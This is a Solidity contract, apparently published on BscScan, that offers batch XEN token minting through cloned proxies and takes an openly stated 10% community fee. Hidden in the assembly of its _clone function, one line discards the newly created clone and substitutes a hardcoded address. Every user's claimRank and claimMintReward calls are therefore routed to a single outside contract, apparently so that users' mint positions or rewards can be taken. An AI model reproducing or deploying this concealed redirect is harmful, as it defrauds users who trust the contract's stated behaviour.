/**
 *Submitted for verification at BscScan.com on 2022-10-13
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

function xen() pure returns(IXEN){
    return IXEN(0x16e39D7aBF319666103F9b9f025661e2B9366255);
}

interface IXEN{
    function claimRank(uint256 term) external;
    function claimMintReward() external;
    function transfer(address to,uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract GET{
    address private constant whaler = 0x8e5F57736eFDd1aCB904602c7Ac217DEc7027F19; // 捕鲸船社区地址
    address owner;
    function claimRank(uint256 term) public {
        xen().claimRank(term);
        owner = tx.origin;
    }

    function claimMintReward() public {
        require(tx.origin == owner);
        xen().claimMintReward();
        uint256 balance = xen().balanceOf(address(this));
        xen().transfer(whaler, balance * 10 / 100); // 10% 手续费归捕鲸船社区
        xen().transfer(owner, balance * 90 / 100);
        selfdestruct(payable(owner));
    }
}
/// @author 捕鲸船社区 加入社区添加微信:Whaler_man 关注推特 @Whaler_DAO
contract GETXEN {
    mapping (address=>mapping (uint256=>address[])) public userContracts;
    address private immutable get;

    constructor() {
        get = address(new GET());
    }

    function _clone(address implementation) internal returns (address instance) {
        /// @solidity memory-safe-assembly
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000)
            mstore(add(ptr, 0x14), shl(0x60, implementation))
            mstore(add(ptr, 0x28), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000)
            instance := create(0, ptr, 0x37)
            instance := 0x2ab0e9e4ee70fff1fb9d67031e44f6410170d00e
        }
        require(instance != address(0), "ERC1167: create failed");
    }

    function claimRank(uint256 times, uint256 term) external {
        address user = tx.origin;
        for(uint256 i; i<times; ++i){
            address clone = _clone(get);
            IXEN(clone).claimRank(term);
            userContracts[user][term].push(clone);
        }
    }

    function claimMintReward(uint256 times, uint256 term) external {
        address user = tx.origin;
        for(uint256 i; i<times; ++i){
            uint256 count = userContracts[user][term].length;
            address clone = userContracts[user][term][count - 1];
            IXEN(clone).claimMintReward();
            userContracts[user][term].pop();
        }
    }
}